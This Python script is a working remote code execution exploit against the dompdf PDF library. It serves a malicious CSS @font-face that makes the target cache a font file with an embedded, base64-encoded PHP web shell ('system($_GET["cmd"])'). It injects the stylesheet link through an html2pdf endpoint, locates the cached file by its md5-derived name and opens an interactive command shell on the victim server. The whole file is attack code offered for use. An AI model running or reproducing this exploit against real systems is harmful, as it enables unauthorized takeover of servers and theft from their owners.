import requests
import sys
import hashlib
import http.server
import socketserver
import threading
import string


port = 8000

# Create a handler to serve the files
handler = http.server.SimpleHTTPRequestHandler

# Set the current directory as the server's base directory
directory = '.'  # You can change this to a specific directory if needed

# Create a class for the threaded HTTP server
class MyHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

def run_server():
    with MyHTTPServer(("", port), handler) as httpd:
        print(f"Serving HTTP on port {port}...")

        # Set the server to serve files from the specified directory
        httpd.directory = directory

        # Start the server and keep it running until interrupted
        httpd.serve_forever()

import base64

def setup(local_ip,random_file):
    template = "@font-face {"
    template += "\nfont-family:'exploitfont';"
    template += f"\nsrc:url('http://{local_ip}:8000/{random_file}.php');"
    template += "\nfont-weight:'normal';"
    template += "\nfont-style:'normal';}"

    with open("evil.css","w") as f:
        f.write(template);

    with open(f"{random_file}.php","wb") as f:
        data = "AAEAAAAKAO+/vQADACBkdW0xAAAAAAAAAO+/vQAAAAJjbWFwAAwAYAAAAO+/vQAAACxnbHlmNXNj77+9AAAA77+9AAAAFGhlYWQH77+9UTYAAADvv70AAAA2aGhlYQDvv70D77+9AAABKAAAACRobXR4BEQACgAAAUwAAAAIbG9jYQAKAAAAAAFUAAAABm1heHAABAADAAABXAAAACBuYW1lAEQQ77+9AAABfAAAADhkdW0yAAAAAAAAAe+/vQAAAAIAAAAAAAAAAQADAAEAAAAMAAQAIAAAAAQABAABAAAALe+/ve+/vQAAAC3vv73vv73vv73vv70AAQAAAAAAAQAKAAAAOgA4AAIAADMjNTowOAABAAAAAQAAF++/ve+/vRZfDzzvv70ACwBAAAAAAO+/vRU4BgAAAADvv70m270ACgAAADoAOAAAAAYAAQAAAAAAAAABAAAATO+/ve+/vQASBAAACgAKADoAAQAAAAAAAAAAAAAAAAAAAAIEAAAAAEQACgAAAAAACgAAAAEAAAACAAMAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEADYAAwABBAkAAQACAAAAAwABBAkAAgACAAAAAwABBAkAAwACAAAAAwABBAkABAACAAAAcwAAAAAKPD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXS4iIDI+JjEiKTsgPz4K"
        dcoded = base64.b64decode(data);
        f.write(dcoded);


# First send a request for a css file
# Then that will trigger a response for a font php file
# That will be cached on the webserver
# Then make a request for the font file
# The font file has the format <fontname>_<style>_<md5_hash>.<extension>
import string
import random

def gen_random_string():
    chars = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(chars) for _ in range(6));
    return random_string;

def inject(url,local_ip):
    json_data = {"html":f"<link rel=stylesheet href=http://{local_ip}:8000/evil.css"};
    r = requests.post(url,json=json_data);




def get_url_hash(local_ip,random_file):
    return hashlib.md5(f"http://{local_ip}:8000/{random_file}.php".encode("UTF-8")).hexdigest();
def read_font(dompdf_url,local_ip,random_file):
    final_url = dompdf_url + "exploitfont_normal_" + get_url_hash(local_ip,random_file) + ".php";
    r = requests.get(final_url);
    if (r.status_code == 200):
        print("[+] Looks like it worked!");
        return True
    else:
        print(f"[-] Eror, didn't receive a 200 OK, received {r.status_code}");
        return False
import os
def cleanup(random_file):
    os.remove(random_file+".php");
    os.remove("evil.css")

import readline
def shell(dompdf_url,random_file):
    final_url = dompdf_url + "exploitfont_normal_" + get_url_hash(local_ip,random_file) + ".php";
    while True:
        try:
            cmd = input("$> ");
        except KeyboardInterrupt:
            print("Bye bye");
            exit()
        r = requests.get(final_url+f"?cmd={cmd}");
        print(r.text[50:]);

if __name__ == "__main__":
    try:
        css_injection_url = sys.argv[1];
        dompdf_url = sys.argv[2];
        local_ip = sys.argv[3];
    except IndexError:
        print(f"Usage {sys.argv[0]} <html2pdf_url> <dompdf_url> <local_ip>");
        print(f"Example: {sys.argv[0]} http://vuln.com/html2pdf http://vuln.com/dompdf/lib/fonts/ 10.10.10.2");
        exit();
#    input("Make sure you have a file evil.css and evil.php ready! Press Enter");
    server_thread = threading.Thread(target=run_server)
# Start the server thread
    random_file = gen_random_string();
    setup(local_ip,random_file)
    server_thread.start()
    inject(css_injection_url,local_ip);
    if (read_font(dompdf_url,local_ip,random_file) == True):
        shell(dompdf_url,random_file);
    cleanup(random_file);
    #httpd = server_thread._target
#   httpd.shutdown()
    server_thread.join()
